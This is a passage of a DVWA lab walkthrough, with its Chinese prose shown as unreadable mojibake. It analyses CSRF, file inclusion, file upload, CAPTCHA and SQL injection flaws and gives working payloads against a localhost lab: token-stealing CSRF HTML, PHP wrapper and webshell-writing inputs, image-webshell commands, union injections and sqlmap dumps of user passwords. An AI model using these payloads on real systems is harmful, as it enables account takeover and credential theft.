æ”»å‡»ã€‚ &lt;script&gt; function attack(){ var token = document.getElementById(\"get_token\").contentWindow.document.getElementsByName('user_token')[0].value document.getElementsByName('user_token')[0].value=token; alert(token); document.getElementById(\"csrf\").submit(); } &lt;/script&gt; &lt;iframe src=\"http://127.0.0.1/dvwa/vulnerabilities/csrf/\" id=\"get_token\" style=\"display:none;\"&gt; &lt;/iframe&gt; &lt;body onload=\"attack()\"&gt; &lt;form method=\"GET\" id=\"csrf\" action=\"http://127.0.0.1/dvwa/vulnerabilities/csrf/\"&gt; &lt;input type=\"hidden\" name=\"password_new\" value=\"123456\"&gt; &lt;input type=\"hidden\" name=\"password_conf\" value=\"123456\"&gt; &lt;input type=\"hidden\" name=\"user_token\" value=\"\"&gt; &lt;input type=\"hidden\" name=\"Change\" value=\"Change\"&gt; &lt;/form&gt; &lt;/body&gt; å°†ä¸Šè¿°æ–‡ä»¶ä¿å­˜ä¸º csrf.html ç„¶åæ”¾å…¥åˆ° CORS ç™½åå•ç›®å½•ä¸‹ï¼Œè¿™åœ¨å®æˆ˜ä¸­æ¯”è¾ƒå°‘è§ï¼Œè¿™é‡Œä¸ºäº†æ¼”ç¤ºæ•ˆæœï¼Œæˆ‘ä»¬å¯ä»¥å°†è¿™ä¸ªæ–‡ä»¶æ”¾å…¥åˆ°é¶åœºæœåŠ¡å™¨çš„æ ¹ç›®å½•ä¸‹ï¼Œç„¶åç›´æ¥è®¿é—®è¿™ä¸ªé¡µé¢å³å¯å‘èµ· CSRF æ”»å‡»ï¼š http://127.0.0.1/dvwa/csrf.html Impossible ä¸ä¹‹å‰çš„çº§åˆ«ä¸åŒç‚¹åœ¨äºï¼Œè¿™é‡Œå¢åŠ äº†ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œè¦æ±‚ç”¨æˆ·å†™å‡ºå½“å‰å¯†ç ï¼Œåªæœ‰å½“å‰å¯†ç æ˜¯æ­£ç¡®çš„ï¼Œæ‰ä¼šæ‰§è¡Œä¿®æ”¹å¯†ç çš„æ“ä½œã€‚ è¿™å¯¹äºä¸çŸ¥é“å—å®³è€…åŸå§‹å¯†ç çš„æ”»å‡»è€…æ¥è¯´ï¼Œæ ¹æœ¬æ— æ³•å®ŒæˆCSRFæ”»å‡»äº†ã€‚ 0x04 File Inclusion Low &lt;?php // The page we wish to display $file = $_GET[ 'page' ]; ?&gt; å¯ä»¥çœ‹åˆ°éå¸¸æ¡æ¼ï¼Œå¯¹äºpageå‚æ•°æ²¡æœ‰åšä»»ä½•é™åˆ¶ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥å®ç°ä»»æ„æ–‡ä»¶åŒ…å«ï¼Œè€Œè¿™é‡Œçš„åŒ…å«å‡½æ•°å¹¶ä¸åœ¨æ­¤ä»£ç ä¸­ã€‚ æ–‡ä»¶è¯»å– æ­£å¸¸åœ¨linuxä¸‹æ˜¯æ˜¯è¦è¯»å–/etc/passwdç­‰æ–‡ä»¶çš„ è¿œç¨‹æ–‡ä»¶åŒ…å« æœ¬åœ°æ–‡ä»¶åŒ…å« Getshell è¿™é‡Œéœ€è¦åŒ¹é…æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œæ¥è¿›è¡Œæœ¬åœ°åŒ…å« è¿œç¨‹æ–‡ä»¶åŒ…å« Getshell å½“ç„¶è¿™é‡Œä¹Ÿå¯ä»¥åŒ…å«è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„æ¶æ„æ–‡ä»¶getshellï¼Œå°±ä¸æ¼”ç¤ºäº† ä¼ªåè®®è¯»å– php://filter ?page=php://filter/convert.base64-encode/resource=index.php è§£ç å³å¯ php://input getshell &lt;?php fputs(fopen('info.php','w'),'&lt;?php phpinfo();?&gt;')?&gt; ä¸è¿‡è¿™é‡Œä¸çŸ¥é“æ˜¯å’ŒåŸå› ï¼Œhackbarå‘ä¸å‡ºå»ï¼Œåªèƒ½bpå‘é€ data:// ä¼ªåè®® æ•°æ®å°è£…å™¨ï¼Œå’Œ php:// ç›¸ä¼¼ï¼Œå¯ä»¥ç›´æ¥æ‰§è¡Œä»»æ„ PHP ä»£ç ï¼š /fi/?page=data:text/plain,&lt;?php phpinfo();?&gt; /fi/?page=data:text/plain;base64, PD9waHAgcGhwaW5mbygpOz8%2b Medium &lt;?php // The page we wish to display $file = $_GET[ 'page' ]; // Input validation $file = str_replace( array( \"http://\", \"https://\" ), \"\", $file ); $file = str_replace( array( \"../\", \"..\\\\\" ), \"\", $file ); ?&gt; è¿™é‡ŒåŠ äº†å‡ ä¸ªè¿‡æ»¤ï¼Œå°†httpåè®®ä¸httpsåè®®è¿‡æ»¤ä¸ºç©ºï¼Œä»¥åŠé˜²æ­¢ç›®å½•ç©¿è¶Šã€‚ ä½†è¿™é‡Œæˆ‘ä»¬æ³¨æ„åˆ°æ²¡æœ‰è¿‡æ»¤ä¼ªåè®®ï¼Œä»¥åŠå®ƒä»…ä»…æ˜¯å°†æ•æ„Ÿå­—ç¬¦è¿‡æ»¤ä¸ºç©ºï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥åŒå†™ç»•è¿‡ ?page=....//....//....//flag.txt åŒæ ·çš„è¿œç¨‹æ–‡ä»¶åŒ…å«ä¹Ÿå¯ä»¥åŒå†™ç»•è¿‡ ?page=hhttp://ttp://www.baidu.com/robots.txt High &lt;?php // The page we wish to display $file = $_GET[ 'page' ]; // Input validation if( !fnmatch( \"file*\", $file ) &amp;&amp; $file != \"include.php\" ) { // This isn't the page we want! echo \"ERROR: File not found!\"; exit; } ?&gt; è¿™é‡Œè¯´å¦‚æœpageå‚æ•°ä¸æ˜¯ä»¥fileå¼€å¤´çš„ï¼Œæˆ–è€…ä¸æ˜¯include.phpï¼Œåˆ™exité€€å‡ºï¼Œå¾ˆæ˜æ˜¾å¯ä»¥ç”¨fileä¼ªåè®® Impossible &lt;?php // The page we wish to display $file = $_GET[ 'page' ]; // Only allow include.php or file{1..3}.php if( $file != \"include.php\" &amp;&amp; $file != \"file1.php\" &amp;&amp; $file != \"file2.php\" &amp;&amp; $file != \"file3.php\" ) { // This isn't the page we want! echo \"ERROR: File not found!\"; exit; } ?&gt; è¿™é‡Œè¿›è¡Œäº†ç™½åå•è¿‡æ»¤ï¼Œå¦‚æœä¸æ˜¯è¿™ä¸‰ä¸ªæŒ‡å®šæ–‡ä»¶ä¸­çš„ä¸€ä¸ªï¼Œåˆ™exité€€å‡ºï¼Œå¾ˆæ˜æ˜¾æˆ‘ä»¬æ— æ³•è¿›è¡Œæ”»å‡»äº†ã€‚ 0x05 File Upload Low &lt;?php if( isset( $_POST[ 'Upload' ] ) ) { // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . \"hackable/uploads/\"; $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) { // No echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; } else { // Yes! echo \"&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;\"; } } ?&gt; é¦–å…ˆè‡ªå®šä¹‰äº†ä¸Šä¼ è·¯å¾„ï¼Œæ¥ç€ç›´æ¥å¯¹uploadå‚æ•°å†…å®¹è¿›è¡Œä¸Šä¼ ï¼Œå¹¶æ²¡æœ‰å¯¹å†…å®¹åšå‡ºè¿‡æ»¤ã€‚å¾ˆæ˜æ˜¾å¯ä»¥ä»»æ„æ–‡ä»¶ä¸Šä¼  è¿™é‡Œå°†ä¸Šä¼ æ–‡ä»¶è·¯å¾„è¾“å‡ºäº†ï¼Œç›´æ¥è·Ÿç€è·¯å¾„è®¿é—®å³å¯ Medium &lt;?php if( isset( $_POST[ 'Upload' ] ) ) { // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . \"hackable/uploads/\"; $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); // File information $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ]; $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; // Is it an image? if( ( $uploaded_type == \"image/jpeg\" || $uploaded_type == \"image/png\" ) &amp;&amp; ( $uploaded_size &lt; 100000 ) ) { // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) { // No echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; } else { // Yes! echo \"&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;\"; } } else { // Invalid file echo '&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'; } } ?&gt; ä¾æ—§æ˜¯å®šä¹‰äº†ä¸Šä¼ è·¯å¾„ï¼Œæ¥ç€å–å‡ºäº†ä¸Šä¼ æ–‡ä»¶çš„æ–‡ä»¶åï¼Œæ–‡ä»¶ç±»å‹ï¼Œæ–‡ä»¶å¤§å°ã€‚ å¦‚æœæ–‡ä»¶ç±»å‹ä¸æ˜¯jpegæˆ–è€…pngï¼Œä¸”æ–‡ä»¶ä¸Šä¼ å¤§å°è¶…å‡ºäº†é™åˆ¶ï¼Œåˆ™ä¸Šä¼ å¤±è´¥ï¼Œå¦åˆ™æˆåŠŸä¸Šä¼ ã€‚ ä½†è¿™é‡Œåªæ˜¯å¯¹content-typeåšå‡ºäº†é™åˆ¶ï¼Œæˆ‘ä»¬ä¿®æ”¹å³å¯ High &lt;?php if( isset( $_POST[ 'Upload' ] ) ) { // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . \"hackable/uploads/\"; $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); // File information $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; $uploaded_tmp = $_FILES[ 'uploaded' ][ 'tmp_name' ]; // Is it an image? if( ( strtolower( $uploaded_ext ) == \"jpg\" || strtolower( $uploaded_ext ) == \"jpeg\" || strtolower( $uploaded_ext ) == \"png\" ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) ) { // Can we move the file to the upload folder? if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) { // No echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; } else { // Yes! echo \"&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;\"; } } else { // Invalid file echo '&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'; } } ?&gt; è¿™é‡Œæ˜¯å–å‡ºäº†æ–‡ä»¶ä¸Šä¼ æ—¶çš„åç¼€åï¼Œå¦‚æœä¸æ˜¯jpgæˆ–è€…jpegæˆ–è€…pngï¼Œåˆ™ä¸Šä¼ å¤±è´¥ã€‚åŒæ—¶è¿˜ä½¿ç”¨getimagesizeå‡½æ•°æ£€æµ‹ä¸Šä¼ çš„æ–‡ä»¶æ˜¯å¦ä¸ºå›¾ç‰‡ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨å›¾ç‰‡é©¬ç»•è¿‡ã€‚ Linuxä¸‹å›¾ç‰‡é©¬çš„åˆ¶ä½œï¼š # å°† shell.php å†…å®¹è¿½åŠ åˆ° pic.png cat shell.php &gt;&gt; pic.png # png + php åˆæˆ png å›¾é©¬ cat pic.png shell.php &gt;&gt; shell.png # ç›´æ¥ echo è¿½åŠ  echo '&lt;?php phpinfo();?&gt;' &gt;&gt; pic.png Windowsä¸‹å›¾ç‰‡é©¬çš„åˆ¶ä½œï¼š copy pic.png/b+shell.php/a shell.png æ­£å¸¸åˆ¶ä½œå›¾ç‰‡é©¬ä¸Šä¼ å³å¯ï¼Œæ¥ç€åˆ©ç”¨ä¸Šä¸€å…³çš„æ–‡ä»¶åŒ…å«æ¼æ´åŒ…å«pngä½¿å…¶è§£æå…¶ä¸­çš„PHPä»£ç å³å¯ Impossible &lt;?php if( isset( $_POST[ 'Upload' ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // File information $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ]; $uploaded_tmp = $_FILES[ 'uploaded' ][ 'tmp_name' ]; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . 'hackable/uploads/'; //$target_file = basename( $uploaded_name, '.' . $uploaded_ext ) . '-'; $target_file = md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext; $temp_file = ( ( ini_get( 'upload_tmp_dir' ) == '' ) ? ( sys_get_temp_dir() ) : ( ini_get( 'upload_tmp_dir' ) ) ); $temp_file .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext; // Is it an image? if( ( strtolower( $uploaded_ext ) == 'jpg' || strtolower( $uploaded_ext ) == 'jpeg' || strtolower( $uploaded_ext ) == 'png' ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; ( $uploaded_type == 'image/jpeg' || $uploaded_type == 'image/png' ) &amp;&amp; getimagesize( $uploaded_tmp ) ) { // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) if( $uploaded_type == 'image/jpeg' ) { $img = imagecreatefromjpeg( $uploaded_tmp ); imagejpeg( $img, $temp_file, 100); } else { $img = imagecreatefrompng( $uploaded_tmp ); imagepng( $img, $temp_file, 9); } imagedestroy( $img ); // Can we move the file to the web root from the temp folder? if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) { // Yes! echo \"&lt;pre&gt;&lt;a href='{$target_path}{$target_file}'&gt;{$target_file}&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;\"; } else { // No echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; } // Delete any temp files if( file_exists( $temp_file ) ) unlink( $temp_file ); } else { // Invalid file echo '&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'; } } // Generate Anti-CSRF token generateSessionToken(); ?&gt; ä½¿ç”¨äº†æ—¶é—´æˆ³çš„md5å€¼åšæ–‡ä»¶åï¼Œç„¶åæ·»åŠ æ–‡ä»¶åç¼€ï¼Œæ¥ç€åˆ¤æ–­åç¼€åä»¥åŠcontent-typeç±»å‹ï¼Œå’Œæ£€æµ‹æ˜¯å¦ä¸ºå›¾ç‰‡ï¼ŒåŒæ—¶ä½¿ç”¨imagecreatefrompngç­‰ç±»ä¼¼å‡½æ•°ï¼Œåˆ é™¤æ‰äº†å…ƒæ•°æ®ï¼Œåˆ›å»ºæ–°å›¾åƒã€‚æ„å‘³ç€å›¾ç‰‡é©¬ä¹Ÿæ— æ³•ç»•è¿‡äº† 0x06 Insecure CAPTCHA Low if( isset( $_POST[ 'Change' ] ) &amp;&amp; ( $_POST[ 'step' ] == '1' ) ) { // Hide the CAPTCHA form $hide_form = true; // Get input $pass_new = $_POST[ 'password_new' ]; $pass_conf = $_POST[ 'password_conf' ]; // Check CAPTCHA from 3rd party $resp = recaptcha_check_answer( $_DVWA[ 'recaptcha_private_key'], $_POST['g-recaptcha-response'] ); // Did the CAPTCHA fail? if( !$resp ) { // What happens when the CAPTCHA was entered incorrectly $html .= \"&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;\"; $hide_form = false; return; } else { // CAPTCHA was correct. Do both new passwords match? if( $pass_new == $pass_conf ) { // Show next stage for the user echo \" &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt; &lt;form action=\\\"#\\\" method=\\\"POST\\\"&gt; &lt;input type=\\\"hidden\\\" name=\\\"step\\\" value=\\\"2\\\" /&gt; &lt;input type=\\\"hidden\\\" name=\\\"password_new\\\" value=\\\"{$pass_new}\\\" /&gt; &lt;input type=\\\"hidden\\\" name=\\\"password_conf\\\" value=\\\"{$pass_conf}\\\" /&gt; &lt;input type=\\\"submit\\\" name=\\\"Change\\\" value=\\\"Change\\\" /&gt; &lt;/form&gt;\"; } else { // Both new passwords do not match. $html .= \"&lt;pre&gt;Both passwords must match.&lt;/pre&gt;\"; $hide_form = false; } } } å‰åŠéƒ¨åˆ†ä»£ç å¦‚ä¸Šï¼Œè¿™é‡Œçœ‹åˆ°ä»–ä¼šå…ˆå»åˆ¤æ–­éªŒè¯ç æ˜¯å¦æ­£ç¡®ï¼Œå¦‚æœæ­£ç¡®æ‰ä¼šæ¥ç€å»åˆ¤æ–­å¯†ç ä¿®æ”¹æƒ…å†µã€‚å¦åˆ™æŠ¥é”™ å…³é”®åœ¨äºç¬¬äºŒéƒ¨åˆ†ä»£ç ï¼š if( isset( $_POST[ 'Change' ] ) &amp;&amp; ( $_POST[ 'step' ] == '2' ) ) { // Hide the CAPTCHA form $hide_form = true; // Get input $pass_new = $_POST[ 'password_new' ]; $pass_conf = $_POST[ 'password_conf' ]; // Check to see if both password match if( $pass_new == $pass_conf ) { // They do! $pass_new = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass_new ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $pass_new = md5( $pass_new ); // Update database $insert = \"UPDATE `users` SET password = '$pass_new' WHERE user = '\" . dvwaCurrentUser() . \"';\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $insert ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); // Feedback for the end user echo \"&lt;pre&gt;Password Changed.&lt;/pre&gt;\"; } else { // Issue with the passwords matching echo \"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;\"; $hide_form = false; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res); } ?&gt; è¿™é‡Œåœ¨ifè¯­å¥çš„å¼€å¤´éƒ½å¯¹stepçš„å‚æ•°åšäº†åˆ¤æ–­ï¼Œå¦‚æœæ˜¯2çš„è¯ï¼Œå°±é»˜è®¤ä¸ºç»å†äº†step=1çš„éªŒè¯ç çš„éªŒè¯ï¼Œæ¥ç€å–å°†ä¿®æ”¹åçš„å¯†ç ç›´æ¥æ’å…¥æ•°æ®åº“æ›´æ–°ï¼ˆåŒæ—¶é˜²æ­¢äº†SQLæ³¨å…¥ï¼‰ è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥åœ¨ä¿®æ”¹å¯†ç ä¹‹åï¼ŒbpæŠ“åŒ…ä¿®æ”¹stepçš„å€¼æ¥ç»•è¿‡ Medium è¿™é‡Œä¸ä¸Šä¸€å…³çš„ä¸åŒç‚¹åœ¨äºï¼Œä¸Šè¿°å›¾ç‰‡ä¸­çš„è¡¨å•formä¸­æ·»åŠ äº†ä¸€ä¸ªéšè—å…ƒç´ passed_captchaå¹¶è¢«è®¾ç½®ä¸ºäº†trueï¼Œè¿™ä¼šè¢«ç”¨äºç¬¬äºŒæ­¥ ä»–ä¼šåˆ¤æ–­passed_captchaè¡¨å•å…ƒç´ æ˜¯å¦å­˜åœ¨ï¼Œä¹Ÿå°±æ˜¯åˆ¤æ–­äº†step=1è¿™ä¸€æ­¥æ˜¯å¦è¢«æ‰§è¡Œè¿‡ï¼Œä½†æˆ‘ä»¬ä¾æ—§å¯ä»¥bpä¿®æ”¹ç»•è¿‡ï¼Œåªéœ€è¦æŠ“åŒ…ä¿®æ”¹stepä¸º2è¿›å…¥ç¬¬äºŒä¸ªifåˆ¤æ–­ï¼Œæ¥ç€æ·»åŠ passed_captchaå…ƒç´ ä¸ºtrueå³å¯ High ä¸å‰å‡ ä¸ªçº§åˆ«ä¸åŒç‚¹åœ¨äºï¼Œè¿™ä¸€å…³å–æ¶ˆäº†stepçš„åˆ¤æ–­ï¼Œä½†å´åœ¨åˆ¤æ–­éªŒè¯ç æ˜¯å¦æ­£ç¡®çš„åŒæ—¶ï¼Œå¤šäº†å¦‚ä¸‹ä»£ç  $_POST[ 'g-recaptcha-response' ] == 'hidd3n_valu3' &amp;&amp; $_SERVER[ 'HTTP_USER_AGENT' ] == 'reCAPTCHA' è¿™æ˜æ‘†ç€ï¼Œç›´æ¥bpä¿®æ”¹å³å¯ï¼Œå¦‚ä¸‹å›¾ï¼Œæ·»åŠ g-recaptcha-responseçš„åŒæ—¶ï¼Œä¿®æ”¹UAå¤´ï¼Œå³å¯ç»•è¿‡ï¼Œä½†è¿™é‡Œæˆ‘ä¼¼ä¹è¿˜éœ€è¦åˆ é™¤stepè¿™ä¸ªå‚æ•°æ‰èƒ½æˆåŠŸï¼Œä¸çŸ¥ä¸ºä½• Impossible if( isset( $_POST[ 'Change' ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Hide the CAPTCHA form $hide_form = true; // Get input $pass_new = $_POST[ 'password_new' ]; $pass_new = stripslashes( $pass_new ); $pass_new = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass_new ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $pass_new = md5( $pass_new ); $pass_conf = $_POST[ 'password_conf' ]; $pass_conf = stripslashes( $pass_conf ); $pass_conf = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass_conf ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $pass_conf = md5( $pass_conf ); $pass_curr = $_POST[ 'password_current' ]; $pass_curr = stripslashes( $pass_curr ); $pass_curr = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass_curr ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $pass_curr = md5( $pass_curr ); // Check CAPTCHA from 3rd party $resp = recaptcha_check_answer( $_DVWA[ 'recaptcha_private_key' ], $_POST['g-recaptcha-response'] ); è¿™ä¸€å…³æ·»åŠ äº†tokenåæ­£äº†CSRFï¼ŒåŒæ—¶æ·»åŠ äº†è¦æ±‚ç”¨æˆ·å¡«å†™å½“å‰å¯†ç çš„åŠŸèƒ½ï¼Œä¹Ÿé˜²æ­¢äº†SQLæ³¨å…¥ï¼Œæ¥ç€åˆ¤æ–­éªŒè¯ç æ˜¯å¦åŒ¹é…ã€‚ å¾ˆæ˜æ˜¾è¿™é‡Œä¿®æ”¹äº†å‰å‡ ä¸ªçº§åˆ«çŠ¯çš„é”™è¯¯ï¼Œæˆ‘ä»¬å·²ç»æ²¡æœ‰åŠæ³•é€šè¿‡å¢åˆ å‚æ•°æ¥ç»•è¿‡äº†ã€‚ 0x07 SQL Injection Low å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œè¿™é‡Œæ˜¾ç¤ºåˆ¤æ–­æ•°æ®åº“ç±»å‹ï¼ˆå¹¶ä¸éœ€è¦åœ¨æ„ï¼‰ï¼Œéšåå¯¹ç”¨æˆ·è¾“å…¥çš„idå‚æ•°è¿›è¡Œæ‹¼æ¥SQLè¯­å¥æŸ¥è¯¢ï¼Œç„¶åç›´æ¥è¿æ¥æ•°æ®åº“æŸ¥è¯¢å¯¹åº”idçš„æ•°æ®ï¼Œå¹¶æœªåšå‡ºä»»ä½•è¿‡æ»¤ï¼Œæˆ‘ä»¬åªéœ€è¦æ­£ç¡®é—­åˆSQLè¯­å¥å³å¯ ?id=1' union select version(), database()--+&amp;Submit=Submit# ç”±äºä»£ç æœ¬èº«å°±æ”¯æŒå±•ç¤ºå¤šè¡Œæ•°æ®ï¼Œä¹Ÿå°±æ²¡å¿…è¦æä»€ä¹ˆåˆ†éš”ç¬¦ä¹‹ç±»çš„æ¥æ˜æ™°æ•°æ®äº† ?id=1' union select user, password from users--+ Medium ä¿®æ”¹çš„ç‚¹åœ¨äºé‡‡ç”¨mysqli_real_escape_stringå‡½æ•°æ¥å¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼Œå…¶ä¸­ç‰¹æ®Šå­—ç¬¦å¦‚ä¸‹å›¾æ‰€å±•ç¤º ä½†è¿™é‡Œå¹¸è¿çš„æ˜¯ï¼Œæ”¹ä¸ºäº†æ•°å­—å‹æŸ¥è¯¢ã€‚ä½†è¿™é‡Œæœ‰é™åˆ¶çš„ç‚¹åœ¨äºï¼Œå½“æˆ‘ä»¬æŸ¥åˆ°è¡¨åä¸ºusersï¼Œæ¥æ¥ä¸‹å›å»æŸ¥è¯¢usersä¸­çš„åˆ—åï¼Œé‚£æ— ç–‘æ˜¯éœ€è¦å•å¼•å·æˆ–è€…åŒå¼•å·åŒ…å›´çš„ï¼Œä½†æˆ‘ä»¬å¯ä»¥é€šè¿‡16è¿›åˆ¶ç»•è¿‡ï¼Œå› ä¸ºSQLæ•°æ®åº“å¯¹16è¿›åˆ¶æ•°æ®ä¼šè‡ªåŠ¨è½¬æ¢ä¸º10è¿›åˆ¶è¯†åˆ« High è¿™ä¸€çº§åˆ«ä¸ç¬¬ä¸€å…³ç±»ä¼¼ï¼Œåªä¸è¿‡idçš„ä½ç½®åœ¨sessionï¼Œå¹¶ä¸åœ¨é¡µé¢å½“ä¸­äº† æˆ‘ä»¬åœ¨inputè¾“å…¥æ¡†ä¸­è¾“å…¥ï¼š?id=-1' union select user, password from users--+å³å¯ Impossible è¿™é‡Œå¤šäº†ä¸€ä¸ªtokençš„éªŒè¯ï¼ŒåŒæ—¶åˆ¤æ–­ç”¨æˆ·è¾“å…¥çš„idæ˜¯å¦ä¸ºæ•°å­—ç±»å‹ï¼Œå¦‚æœä¸æ˜¯ç›´æ¥æ— æ•ˆï¼Œå¦‚æœæ˜¯çš„è¯ï¼Œå¼ºåˆ¶è½¬æ¢ä¸ºæ•´æ•°ç±»å‹ï¼Œæ¥ç€é‡‡ç”¨PDOé¢„ç¼–è¯‘ï¼Œå¯¼è‡´æˆ‘ä»¬æ— æ³•è¿›è¡ŒSQLè¯­å¥çš„é—­åˆ prepare é¢„ç¼–è¯‘è¯­å¥çš„ä¼˜åŠ¿åœ¨äºå½’çº³ä¸ºï¼šä¸€æ¬¡ç¼–è¯‘ã€å¤šæ¬¡è¿è¡Œï¼Œçœå»äº†è§£æä¼˜åŒ–ç­‰è¿‡ç¨‹ï¼›æ­¤å¤–é¢„ç¼–è¯‘è¯­å¥èƒ½é˜²æ­¢ SQL æ³¨å…¥ã€‚ 0x08 SQL Injection (Blind) Low ä¸Šè¿°ä¸¤å¤„ä»£ç ç»“åˆä¼šå‘ç°ï¼Œå³ä½¿æˆ‘ä»¬æŸ¥è¯¢æˆåŠŸï¼Œä¹Ÿåªä¼šæ˜¾ç¤ºæ˜¯å¦æˆåŠŸçš„æ¶ˆæ¯å±•ç¤ºï¼Œå¹¶ä¸ä¼šå°†æ•°æ®æ˜¾ç¤ºå‡ºæ¥ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬åªèƒ½è¿›è¡Œç›²æ³¨äº† åŒæ—¶è¿™ä¸SQLæ³¨å…¥ç±»ä¼¼ï¼Œå¹¶ä¸æ²¡æœ‰åšå‡ºä»»ä½•è¿‡æ»¤ python3 sqlmap.py -u \"http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=1*&amp;Submit=Submit#\" --cookie \"security=low; PHPSESSID=cp58onvdgg0k61kihafkofof9j\" --current-db python3 sqlmap.py -u \"http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=1*&amp;Submit=Submit#\" --cookie \"security=low; PHPSESSID=cp58onvdgg0k61kihafkofof9j\" -D dvwa --tables python3 sqlmap.py -u \"http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=1*&amp;Submit=Submit#\" --cookie \"security=low; PHPSESSID=cp58onvdgg0k61kihafkofof9j\" -D dvwa -T users --dump --batch Medium ä¾æ—§æ˜¯ç›²æ³¨ï¼Œè™½ç„¶è¿™é‡Œå¯¹idå‚æ•°åšäº†ç‰¹æ®Šå­—ç¬¦è½¬ç§»ï¼Œä½†ç±»ä¼¼0x07çš„ SQLæ³¨å…¥ï¼Œæˆ‘ä»¬ä¾æ—§æ˜¯å¯ä»¥ç»•è¿‡çš„ï¼Œæ¯”å¦‚16è¿›åˆ¶ã€‚ äº¤ç»™sqlmapå®Œå…¨å¯ä»¥ python3 sqlmap.py -u \"http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=1*&amp;Submit=Submit#\" --cookie \"security=medium; PHPSESSID=cp58onvdgg0k61kihafkofof9j\" -D dvwa 